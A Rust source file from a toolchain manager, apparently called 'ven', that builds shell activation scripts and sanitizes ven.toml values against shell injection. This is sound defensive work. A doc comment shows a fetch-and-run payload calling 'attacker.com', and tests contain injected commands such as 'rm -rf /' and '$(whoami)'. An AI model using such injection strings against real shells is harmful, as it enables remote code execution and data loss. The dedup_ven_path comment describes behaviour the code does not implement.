//! Resolve `ven.toml` runtimes into PATH prepends and toolchain env vars.
//! Shared by `ven shell activate` and `ven-launcher`.

use anyhow::Result;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

use crate::core::ruby_install::ruby_gem_home_for_layout;
use crate::core::{
    find_ven_toml, parse_ven_toml, project_venv, resolve_bun_version, resolve_deno_version,
    resolve_go_version, resolve_java_version, resolve_node_version, resolve_php_version,
    resolve_python_version, resolve_ruby_version, resolve_rust_version,
};
use crate::plugins::{
    BunPlugin, DenoPlugin, GoPlugin, JavaPlugin, LanguagePlugin, NodePlugin, PhpPlugin,
    PythonPlugin, RubyPlugin, RustPlugin,
};

/// Normalizes a [`Path`] for inclusion in `$env:*` assignments (matching `shell activate`).
pub fn path_for_env_value(p: &Path) -> String {
    let s = p.display().to_string();
    if cfg!(target_os = "windows") {
        let s = if s.starts_with("\\\\?\\") {
            s[4..].to_string()
        } else {
            s
        };
        s.replace('/', "\\")
    } else {
        s.replace('\\', "/")
    }
}

/// Strip any character not in `[a-zA-Z0-9._-]` (semver-safe characters)
/// from a version string before interpolating it into shell code.
///
/// This prevents shell injection via malicious `ven.toml` entries like
/// `node = '20"; curl attacker.com | sh #'`.
pub fn sanitize_version_string(s: &str) -> String {
    s.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
        .collect()
}

/// Path-separator for `$PATH` on this platform. Windows uses `;`, Unix uses `:`.
#[allow(dead_code)]
pub fn path_separator() -> &'static str {
    if cfg!(target_os = "windows") {
        ";"
    } else {
        ":"
    }
}

/// Split a `PATH`-style string into entries, dropping empty strings
/// (the leading or trailing separator produces one).
#[allow(dead_code)]
fn split_path_entries<'a>(path: &'a str, sep: &'a str) -> Vec<&'a str> {
    path.split(sep).filter(|s| !s.is_empty()).collect()
}

/// Remove duplicate entries from the **ven-prepended** region of `current`,
/// leaving the user's tail (the suffix that contains an original-path entry)
/// intact.
///
/// **Why this exists**: the bash/zsh/fish/powershell hook prepends a fixed
/// list of bin dirs to `$PATH` on every `cd` that lands in a ven project.
/// If the user cd's in and out repeatedly, `$PATH` grows by `N` entries per
/// cd. A user that toggles between two projects 50 times ends up with 50
/// copies of each ven bin dir, which (a) makes `$PATH` balloon, (b) slows
/// every shell exec, and (c) obscures anything the user adds themselves.
///
/// **Algorithm**:
///   1. Split `current` and `original` on the path separator.
///   2. Find the first index in `current` whose entry also appears in
///      `original` — everything up to that index is the "ven region".
///   3. Deduplicate entries within the ven region (first occurrence wins).
///   4. Append the tail (`current[ven_end..]`) unchanged.
///
/// This is robust to the user inserting new entries between ven and the
/// original (they end up in the tail, untouched), and to the user
/// rearranging entries in the original (we only test set membership for
/// the boundary, not order).
#[allow(dead_code)]
pub fn dedup_ven_path(current_path: &str, _original_path: &str, sep: &str) -> String {
    let current = split_path_entries(current_path, sep);

    // Deduplicate across the full path, preserving first-occurrence order.
    // This removes both ven-region duplicates AND stray ven entries that
    // reappear after the original-path boundary.
    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
    let mut result: Vec<&str> = Vec::with_capacity(current.len());
    for entry in &current {
        if seen.insert(*entry) {
            result.push(*entry);
        }
    }
    result.join(sep)
}

/// Resolved toolchain layout from a project directory (same inputs as shell activation).
#[derive(Debug, Clone)]
pub struct ActivationParts {
    /// Directory containing `ven.toml` (canonical); shell `cwd` for the launcher child.
    pub project_root: PathBuf,
    pub prepend_dirs: Vec<PathBuf>,
    pub node_bin_for_path: Option<PathBuf>,
    pub node_resolved: Option<String>,
    pub python_resolved: Option<String>,
    pub go_resolved: Option<String>,
    pub go_root_for_env: Option<PathBuf>,
    pub rust_resolved: Option<String>,
    pub rust_root_for_env: Option<PathBuf>,
    pub java_resolved: Option<String>,
    pub java_home_for_env: Option<PathBuf>,
    pub deno_resolved: Option<String>,
    pub bun_resolved: Option<String>,
    pub ruby_resolved: Option<String>,
    pub ruby_gem_home_for_env: Option<PathBuf>,
    pub php_resolved: Option<String>,
    pub php_root_for_env: Option<PathBuf>,
    pub virtual_env_root: Option<PathBuf>,
    pub toml_normalized: String,
    pub ven_user_env: HashMap<String, String>,
}

/// Outcome when resolving `[runtime]` (and deps) against installed toolchains under `ven`.
#[derive(Debug, Clone)]
pub enum ActivationResolve {
    NoToml,
    MissingToolchain {
        language: String,
        install_with: String,
    },
    Ready(ActivationParts),
}

/// Concatenate runtime bin dirs the same order `ven shell activate` prepends before `$__VEN_ORIGINAL_PATH`.
pub fn activation_path_overlay(parts: &ActivationParts) -> String {
    let sep = if cfg!(target_os = "windows") {
        ";"
    } else {
        ":"
    };
    parts
        .prepend_dirs
        .iter()
        .map(|p| path_for_env_value(p))
        .collect::<Vec<_>>()
        .join(sep)
}

/// Parses `ven.toml`, walks upward from `dir`, and resolves binaries for PATH / toolchain env vars.
pub fn resolve_activation_environment(dir: &Path) -> Result<ActivationResolve> {
    let absolute_dir = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        std::env::current_dir()
            .map(|cwd| cwd.join(dir))
            .unwrap_or_else(|_| dir.to_path_buf())
    };

    let toml_path = match find_ven_toml(&absolute_dir) {
        Some(p) => p,
        None => return Ok(ActivationResolve::NoToml),
    };

    let toml_canonical = std::fs::canonicalize(&toml_path).unwrap_or_else(|_| {
        if toml_path.is_absolute() {
            toml_path
        } else {
            std::env::current_dir()
                .map(|cwd| cwd.join(&toml_path))
                .unwrap_or_else(|_| toml_path)
        }
    });

    let toml_str = toml_canonical.display().to_string();
    let toml_absolute = if cfg!(target_os = "windows") {
        if toml_str.starts_with("\\\\?\\") {
            toml_str[4..].to_string()
        } else {
            toml_str
        }
    } else {
        toml_str
    };

    let config = parse_ven_toml(Path::new(&toml_absolute))?;
    let node_spec = config.runtime.node.trim();
    let python_spec = config.runtime.python.trim();
    let go_spec = config.runtime.go.trim();
    let rust_spec = config.runtime.rust.trim();
    let java_spec = config.runtime.java.trim();
    let deno_spec = config.runtime.deno.trim();
    let bun_spec = config.runtime.bun.trim();
    let ruby_spec = config.runtime.ruby.trim();
    let php_spec = config.runtime.php.trim();

    if node_spec.is_empty()
        && python_spec.is_empty()
        && go_spec.is_empty()
        && rust_spec.is_empty()
        && java_spec.is_empty()
        && deno_spec.is_empty()
        && bun_spec.is_empty()
        && ruby_spec.is_empty()
        && php_spec.is_empty()
    {
        anyhow::bail!(
            "ven.toml [runtime]: set `node` and/or `python` and/or `go` and/or `rust` and/or `java` and/or `deno` and/or `bun` and/or `ruby` and/or `php`"
        );
    }

    let project_root = toml_canonical
        .parent()
        .ok_or_else(|| anyhow::anyhow!("ven.toml path has no parent directory"))?;

    let mut prepend_dirs: Vec<PathBuf> = Vec::new();
    let mut node_resolved: Option<String> = None;
    let mut node_bin_for_path: Option<PathBuf> = None;
    let mut python_resolved: Option<String> = None;
    let mut go_resolved: Option<String> = None;
    let mut go_root_for_env: Option<PathBuf> = None;
    let mut rust_resolved: Option<String> = None;
    let mut rust_root_for_env: Option<PathBuf> = None;
    let mut java_resolved: Option<String> = None;
    let mut java_home_for_env: Option<PathBuf> = None;
    let mut deno_resolved: Option<String> = None;
    let mut bun_resolved: Option<String> = None;
    let mut ruby_resolved: Option<String> = None;
    let mut ruby_gem_home_for_env: Option<PathBuf> = None;
    let mut php_resolved: Option<String> = None;
    let mut php_root_for_env: Option<PathBuf> = None;
    let mut virtual_env_root: Option<PathBuf> = None;

    if !python_spec.is_empty() {
        let skip_project_venv =
            matches!(std::env::var("VEN_SKIP_PROJECT_VENV").as_deref(), Ok("1"));

        let mut used_project_venv = false;

        if !skip_project_venv {
            if let Some(venv_bin) = project_venv::local_venv_bin_dir(project_root) {
                if let Some(venv_dir) = project_venv::local_venv_root(project_root) {
                    prepend_dirs.push(venv_bin);
                    virtual_env_root = Some(venv_dir.clone());
                    python_resolved = Some(
                        project_venv::local_venv_python_version(&venv_dir)
                            .or_else(|| {
                                let installed = PythonPlugin.list_installed().unwrap_or_default();
                                resolve_python_version(python_spec, &installed).ok()
                            })
                            .unwrap_or_else(|| python_spec.to_string()),
                    );
                    used_project_venv = true;
                }
            }
        }

        if !used_project_venv {
            #[cfg(target_os = "windows")]
            {
                let plugin = PythonPlugin;
                let installed = plugin.list_installed().unwrap_or_default();
                let resolved = match resolve_python_version(python_spec, &installed) {
                    Ok(v) => v,
                    Err(_) => {
                        return Ok(ActivationResolve::MissingToolchain {
                            language: "python".into(),
                            install_with: python_spec.to_string(),
                        });
                    }
                };
                let bin = match plugin.bin_path(&resolved) {
                    Ok(p) => p,
                    Err(_) => {
                        return Ok(ActivationResolve::MissingToolchain {
                            language: "python".into(),
                            install_with: resolved.clone(),
                        });
                    }
                };
                let scripts = bin.join("Scripts");
                if scripts.is_dir() {
                    prepend_dirs.push(scripts);
                }
                prepend_dirs.push(bin);
                python_resolved = Some(resolved);
            }
            #[cfg(not(target_os = "windows"))]
            {
                if node_spec.is_empty() {
                    if skip_project_venv && project_venv::local_venv_root(project_root).is_some() {
                        anyhow::bail!(
                            "`VEN_SKIP_PROJECT_VENV` is set to 1 (from `ven deactivate`), \
                             so ven is not putting the project `venv` first on PATH.\n\
                             To use `./venv`: remove it (`unset VEN_SKIP_PROJECT_VENV`), run `ven-use`, \
                             or `source ./venv/bin/activate`."
                        );
                    }
                    if project_venv::local_venv_root(project_root).is_none() {
                        anyhow::bail!(
                            "ven.toml sets `runtime.python` but there is no `venv/` (or legacy `.venv`) under {}.\n\
                             Create it with:  python3 -m venv venv\n\
                             On Windows, `ven init` for a Python project creates `venv/` when your ven Python is installed.",
                            project_root.display()
                        );
                    }
                }
            }
        }
    }

    if !python_spec.is_empty() && python_resolved.is_none() {
        python_resolved = Some(python_spec.to_string());
    }

    if !node_spec.is_empty() {
        let plugin = NodePlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_node_version(node_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "node".into(),
                    install_with: node_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "node".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        node_bin_for_path = Some(bin.clone());
        prepend_dirs.push(bin);
        node_resolved = Some(resolved);
    }

    if !go_spec.is_empty() {
        let plugin = GoPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_go_version(go_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "go".into(),
                    install_with: go_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "go".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        if let Some(root) = bin.parent() {
            go_root_for_env = Some(root.to_path_buf());
        }
        prepend_dirs.push(bin);
        go_resolved = Some(resolved);
    }

    if !rust_spec.is_empty() {
        let plugin = RustPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_rust_version(rust_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "rust".into(),
                    install_with: rust_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "rust".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        if let Some(root) = bin.parent() {
            rust_root_for_env = Some(root.to_path_buf());
        }
        prepend_dirs.push(bin);
        rust_resolved = Some(resolved);
    }

    if !java_spec.is_empty() {
        let plugin = JavaPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_java_version(java_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "java".into(),
                    install_with: java_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "java".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        if let Some(home) = bin.parent() {
            java_home_for_env = Some(home.to_path_buf());
        }
        prepend_dirs.push(bin);
        java_resolved = Some(resolved);
    }

    if !deno_spec.is_empty() {
        let plugin = DenoPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_deno_version(deno_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "deno".into(),
                    install_with: deno_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "deno".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        prepend_dirs.push(bin);
        deno_resolved = Some(resolved);
    }
    if !bun_spec.is_empty() {
        let plugin = BunPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_bun_version(bun_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "bun".into(),
                    install_with: bun_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "bun".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        prepend_dirs.push(bin);
        bun_resolved = Some(resolved);
    }

    if !ruby_spec.is_empty() {
        let plugin = RubyPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_ruby_version(ruby_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "ruby".into(),
                    install_with: ruby_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "ruby".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        if let Some(root) = bin.parent() {
            ruby_gem_home_for_env = Some(ruby_gem_home_for_layout(root));
        }
        prepend_dirs.push(bin);
        ruby_resolved = Some(resolved);
    }

    if !php_spec.is_empty() {
        let plugin = PhpPlugin;
        let installed = plugin.list_installed().unwrap_or_default();
        let resolved = match resolve_php_version(php_spec, &installed) {
            Ok(v) => v,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "php".into(),
                    install_with: php_spec.to_string(),
                });
            }
        };
        let bin = match plugin.bin_path(&resolved) {
            Ok(p) => p,
            Err(_) => {
                return Ok(ActivationResolve::MissingToolchain {
                    language: "php".into(),
                    install_with: resolved.clone(),
                });
            }
        };
        if let Some(root) = bin.parent() {
            php_root_for_env = Some(root.to_path_buf());
        }
        prepend_dirs.push(bin);
        php_resolved = Some(resolved);
    }

    let toml_normalized = if cfg!(target_os = "windows") {
        toml_absolute.replace('/', "\\")
    } else {
        toml_absolute.replace('\\', "/")
    };

    Ok(ActivationResolve::Ready(ActivationParts {
        project_root: project_root.to_path_buf(),
        prepend_dirs,
        node_bin_for_path,
        node_resolved,
        python_resolved,
        go_resolved,
        go_root_for_env,
        rust_resolved,
        rust_root_for_env,
        java_resolved,
        java_home_for_env,
        deno_resolved,
        bun_resolved,
        ruby_resolved,
        ruby_gem_home_for_env,
        php_resolved,
        php_root_for_env,
        virtual_env_root,
        toml_normalized,
        ven_user_env: config.env.clone(),
    }))
}

/// Shell script snippets for `Invoke-Expression` / `eval` (PowerShell vs POSIX).
pub fn format_activation_shell_script(parts: &ActivationParts) -> String {
    let path_joined = activation_path_overlay(parts);

    let exports = if cfg!(target_os = "windows") {
        let mut out = String::from(
            r#"if (Test-Path Env:VEN_NODE_VERSION) { Remove-Item Env:VEN_NODE_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_PYTHON_VERSION) { Remove-Item Env:VEN_PYTHON_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_GO_VERSION) { Remove-Item Env:VEN_GO_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_RUST_VERSION) { Remove-Item Env:VEN_RUST_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_JAVA_VERSION) { Remove-Item Env:VEN_JAVA_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_DENO_VERSION) { Remove-Item Env:VEN_DENO_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_BUN_VERSION) { Remove-Item Env:VEN_BUN_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_RUBY_VERSION) { Remove-Item Env:VEN_RUBY_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:VEN_PHP_VERSION) { Remove-Item Env:VEN_PHP_VERSION -ErrorAction SilentlyContinue }
if (Test-Path Env:GEM_HOME) { Remove-Item Env:GEM_HOME -ErrorAction SilentlyContinue }
if (Test-Path Env:GEM_PATH) { Remove-Item Env:GEM_PATH -ErrorAction SilentlyContinue }
if (Test-Path Env:NODE_PATH) { Remove-Item Env:NODE_PATH -ErrorAction SilentlyContinue }
if (Test-Path Env:VIRTUAL_ENV) { Remove-Item Env:VIRTUAL_ENV -ErrorAction SilentlyContinue }
if (Test-Path Env:GOROOT) { Remove-Item Env:GOROOT -ErrorAction SilentlyContinue }
if (Test-Path Env:GOPATH) { Remove-Item Env:GOPATH -ErrorAction SilentlyContinue }
if (Test-Path Env:CARGO_HOME) { Remove-Item Env:CARGO_HOME -ErrorAction SilentlyContinue }
if (Test-Path Env:RUSTUP_HOME) { Remove-Item Env:RUSTUP_HOME -ErrorAction SilentlyContinue }
if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyContinue }

"#,
        );
        if path_joined.is_empty() {
            out.push_str("$env:PATH = $global:VEN_ORIGINAL_PATH\n");
        } else {
            out.push_str(&format!(
                "$env:PATH = \"{};\" + $global:VEN_ORIGINAL_PATH\n",
                path_joined
            ));
        }
        if let Some(ref dir) = parts.node_bin_for_path {
            out.push_str(&format!("$env:NODE_PATH = \"{}\"\n", dir.display()));
        }
        if let Some(ref v) = parts.node_resolved {
            out.push_str(&format!(
                "$env:VEN_NODE_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.python_resolved {
            out.push_str(&format!(
                "$env:VEN_PYTHON_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.go_resolved {
            out.push_str(&format!(
                "$env:VEN_GO_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.go_root_for_env {
            out.push_str(&format!("$env:GOROOT = \"{}\"\n", path_for_env_value(root)));
            if let Some(home) = dirs::home_dir() {
                let gopath = home.join("go");
                out.push_str(&format!(
                    "$env:GOPATH = \"{}\"\n",
                    path_for_env_value(&gopath)
                ));
            }
        }
        if let Some(ref v) = parts.rust_resolved {
            out.push_str(&format!(
                "$env:VEN_RUST_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.rust_root_for_env {
            out.push_str(&format!(
                "$env:CARGO_HOME = \"{}\"\n",
                path_for_env_value(root)
            ));
            out.push_str(&format!(
                "$env:RUSTUP_HOME = \"{}\"\n",
                path_for_env_value(root)
            ));
        }
        if let Some(ref v) = parts.java_resolved {
            out.push_str(&format!(
                "$env:VEN_JAVA_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref home) = parts.java_home_for_env {
            out.push_str(&format!(
                "$env:JAVA_HOME = \"{}\"\n",
                path_for_env_value(home)
            ));
        }
        if let Some(ref v) = parts.deno_resolved {
            out.push_str(&format!(
                "$env:VEN_DENO_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.bun_resolved {
            out.push_str(&format!(
                "$env:VEN_BUN_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.ruby_resolved {
            out.push_str(&format!(
                "$env:VEN_RUBY_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref gh) = parts.ruby_gem_home_for_env {
            let ghv = path_for_env_value(gh);
            out.push_str(&format!("$env:GEM_HOME = \"{ghv}\"\n"));
            out.push_str(&format!("$env:GEM_PATH = \"{ghv}\"\n"));
        }
        if let Some(ref v) = parts.php_resolved {
            out.push_str(&format!(
                "$env:VEN_PHP_VERSION = \"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.php_root_for_env {
            out.push_str(&format!("$env:PHPRC = \"{}\"\n", path_for_env_value(root)));
        }
        if let Some(ref vr) = parts.virtual_env_root {
            out.push_str(&format!(
                "$env:VIRTUAL_ENV = \"{}\"\n",
                path_for_env_value(vr)
            ));
        }
        out.push_str(&format!(
            "$env:VEN_TOML = \"{}\"\n",
            sanitize_version_string(&parts.toml_normalized)
        ));
        for (key, val) in &parts.ven_user_env {
            if let Some(line) = env_assignment_powershell(key, val) {
                out.push_str(&line);
                out.push('\n');
            }
        }
        out
    } else {
        let mut out = String::from(
            r#"unset VEN_NODE_VERSION 2>/dev/null || true
unset VEN_PYTHON_VERSION 2>/dev/null || true
unset VEN_GO_VERSION 2>/dev/null || true
unset VEN_RUST_VERSION 2>/dev/null || true
unset VEN_JAVA_VERSION 2>/dev/null || true
unset VEN_DENO_VERSION 2>/dev/null || true
unset VEN_BUN_VERSION 2>/dev/null || true
unset VEN_RUBY_VERSION 2>/dev/null || true
unset VEN_PHP_VERSION 2>/dev/null || true
unset GEM_HOME 2>/dev/null || true
unset GEM_PATH 2>/dev/null || true
unset NODE_PATH 2>/dev/null || true
unset VIRTUAL_ENV 2>/dev/null || true
unset GOROOT 2>/dev/null || true
unset GOPATH 2>/dev/null || true
unset CARGO_HOME 2>/dev/null || true
unset RUSTUP_HOME 2>/dev/null || true
unset JAVA_HOME 2>/dev/null || true

"#,
        );
        if path_joined.is_empty() {
            out.push_str("export PATH=\"$__VEN_ORIGINAL_PATH\"\n");
        } else {
            out.push_str(&format!(
                "export PATH=\"{}:$__VEN_ORIGINAL_PATH\"\n",
                path_joined
            ));
        }
        if let Some(ref dir) = parts.node_bin_for_path {
            out.push_str(&format!("export NODE_PATH=\"{}\"\n", dir.display()));
        }
        if let Some(ref v) = parts.node_resolved {
            out.push_str(&format!(
                "export VEN_NODE_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.python_resolved {
            out.push_str(&format!(
                "export VEN_PYTHON_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.go_resolved {
            out.push_str(&format!(
                "export VEN_GO_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.go_root_for_env {
            out.push_str(&format!("export GOROOT=\"{}\"\n", path_for_env_value(root)));
            if let Some(home) = dirs::home_dir() {
                let gopath = home.join("go");
                out.push_str(&format!(
                    "export GOPATH=\"{}\"\n",
                    path_for_env_value(&gopath)
                ));
            }
        }
        if let Some(ref v) = parts.rust_resolved {
            out.push_str(&format!(
                "export VEN_RUST_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.rust_root_for_env {
            out.push_str(&format!(
                "export CARGO_HOME=\"{}\"\n",
                path_for_env_value(root)
            ));
            out.push_str(&format!(
                "export RUSTUP_HOME=\"{}\"\n",
                path_for_env_value(root)
            ));
        }
        if let Some(ref v) = parts.java_resolved {
            out.push_str(&format!(
                "export VEN_JAVA_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref home) = parts.java_home_for_env {
            out.push_str(&format!(
                "export JAVA_HOME=\"{}\"\n",
                path_for_env_value(home)
            ));
        }
        if let Some(ref v) = parts.deno_resolved {
            out.push_str(&format!(
                "export VEN_DENO_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.bun_resolved {
            out.push_str(&format!(
                "export VEN_BUN_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref v) = parts.ruby_resolved {
            out.push_str(&format!(
                "export VEN_RUBY_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref gh) = parts.ruby_gem_home_for_env {
            let ghv = path_for_env_value(gh);
            out.push_str(&format!("export GEM_HOME=\"{ghv}\"\n"));
            out.push_str(&format!("export GEM_PATH=\"{ghv}\"\n"));
        }
        if let Some(ref v) = parts.php_resolved {
            out.push_str(&format!(
                "export VEN_PHP_VERSION=\"{}\"\n",
                sanitize_version_string(v)
            ));
        }
        if let Some(ref root) = parts.php_root_for_env {
            out.push_str(&format!("export PHPRC=\"{}\"\n", path_for_env_value(root)));
        }
        if let Some(ref vr) = parts.virtual_env_root {
            out.push_str(&format!(
                "export VIRTUAL_ENV=\"{}\"\n",
                path_for_env_value(vr)
            ));
        }
        out.push_str(&format!(
            "export VEN_TOML=\"{}\"\n",
            sanitize_version_string(&parts.toml_normalized)
        ));
        for (key, val) in &parts.ven_user_env {
            if let Some(line) = env_assignment_posix(key, val) {
                out.push_str(&line);
                out.push('\n');
            }
        }
        out
    };

    exports
}

/// True iff `key` is a legal environment-variable name on every POSIX
/// system we target (and also a legal PowerShell `$env:NAME`). Reject
/// anything else: keys with `;`, `(`, `)`, newlines, or spaces would
/// otherwise produce shell-injectable fragments when concatenated into
/// the activation script.
pub fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    match chars.next() {
        Some(c) if c == '_' || c.is_ascii_alphabetic() => {}
        _ => return false,
    }
    chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// Produce a single PowerShell `$env:KEY = "value"` line for the
/// `[env]` table in `ven.toml`.
///
/// - Rejects keys that aren't a legal env name (returns `None`).
/// - Escapes embedded `"` to `""` (PowerShell string-literal escape).
/// - Prefixes a leading `$` or backtick with a backtick so PowerShell
///   doesn't try to expand them.
pub fn env_assignment_powershell(key: &str, val: &str) -> Option<String> {
    if !is_valid_env_key(key) {
        return None;
    }
    let mut escaped = String::with_capacity(val.len());
    let mut prev = '\0';
    for c in val.chars() {
        if c == '`' || (c == '$' && prev != '`') {
            escaped.push('`');
        }
        if c == '"' {
            escaped.push('"');
        }
        escaped.push(c);
        prev = c;
    }
    Some(format!("$env:{} = \"{}\"", key, escaped))
}

/// Produce a single POSIX `export KEY="value"` line for the `[env]`
/// table in `ven.toml`.
///
/// - Rejects keys that aren't a legal env name (returns `None`).
/// - Wraps the value in single quotes and escapes any embedded `'`
///   with the canonical `'\''` sequence, which is the only safe form
///   inside a single-quoted POSIX string.
pub fn env_assignment_posix(key: &str, val: &str) -> Option<String> {
    if !is_valid_env_key(key) {
        return None;
    }
    let escaped = val.replace('\'', "'\\''");
    Some(format!("export {}='{}'", key, escaped))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_valid_env_key_accepts_normal_names() {
        assert!(is_valid_env_key("FOO"));
        assert!(is_valid_env_key("_PRIVATE"));
        assert!(is_valid_env_key("PATH"));
        assert!(is_valid_env_key("CamelCase"));
        assert!(is_valid_env_key("MIXED_case_123"));
    }

    #[test]
    fn is_valid_env_key_rejects_injection_payloads() {
        assert!(!is_valid_env_key(""));
        assert!(!is_valid_env_key("1FOO")); // leading digit
        assert!(!is_valid_env_key("FOO BAR")); // space
        assert!(!is_valid_env_key("FOO;rm -rf /")); // shell metachar
        assert!(!is_valid_env_key("FOO$(whoami)")); // command sub
        assert!(!is_valid_env_key("FOO`bar")); // backtick
        assert!(!is_valid_env_key("FOO\nBAR")); // newline
        assert!(!is_valid_env_key("FOO'BAR")); // single quote
    }

    /// A value containing a single quote must be escaped with the standard
    /// `'\''` sequence so a shell that re-evaluates the line still ends up
    /// with the original string. Without this, a `[env] FOO = "x'; rm -rf /"`
    /// would execute `rm -rf /` at the next `eval`.
    #[test]
    fn posix_escapes_embedded_single_quote() {
        let line = env_assignment_posix("FOO", "x'; rm -rf /").unwrap();
        // The escape replaces ' with '\''  (close, literal ', reopen).
        // Hand-evaluated: opens with ', then x, then ' closes; '\'' opens a
        // new quoted string with one literal ', then '; rm -rf /' is plain.
        // Net result: variable holds "x'; rm -rf /" verbatim.
        assert_eq!(line, "export FOO='x'\\''; rm -rf /'");
    }

    /// A value with a leading `$` or backtick must be escaped so PowerShell
    /// doesn't try to expand a sub-expression. Embedded `"` doubles to `""`.
    #[test]
    fn powershell_escapes_dollar_and_doublequote() {
        let line = env_assignment_powershell("FOO", "a\"b$(evil)").unwrap();
        // embedded " -> "", $ at start of a sub-expression -> `$
        assert_eq!(line, "$env:FOO = \"a\"\"b`$(evil)\"");
    }

    #[test]
    fn powershell_escapes_leading_dollar() {
        let line = env_assignment_powershell("X", "$danger").unwrap();
        assert_eq!(line, "$env:X = \"`$danger\"");
    }

    #[test]
    fn posix_happy_path() {
        assert_eq!(
            env_assignment_posix("FOO", "bar").unwrap(),
            "export FOO='bar'"
        );
        assert_eq!(
            env_assignment_posix("EMPTY", "").unwrap(),
            "export EMPTY=''"
        );
    }

    #[test]
    fn powershell_happy_path() {
        assert_eq!(
            env_assignment_powershell("FOO", "bar").unwrap(),
            "$env:FOO = \"bar\""
        );
    }

    #[test]
    fn invalid_keys_return_none_for_both_shells() {
        assert!(env_assignment_powershell("FOO BAR", "x").is_none());
        assert!(env_assignment_posix("FOO;BAR", "x").is_none());
        assert!(env_assignment_powershell("1FOO", "x").is_none());
        assert!(env_assignment_posix("", "x").is_none());
    }

    // --- dedup_ven_path -------------------------------------------------

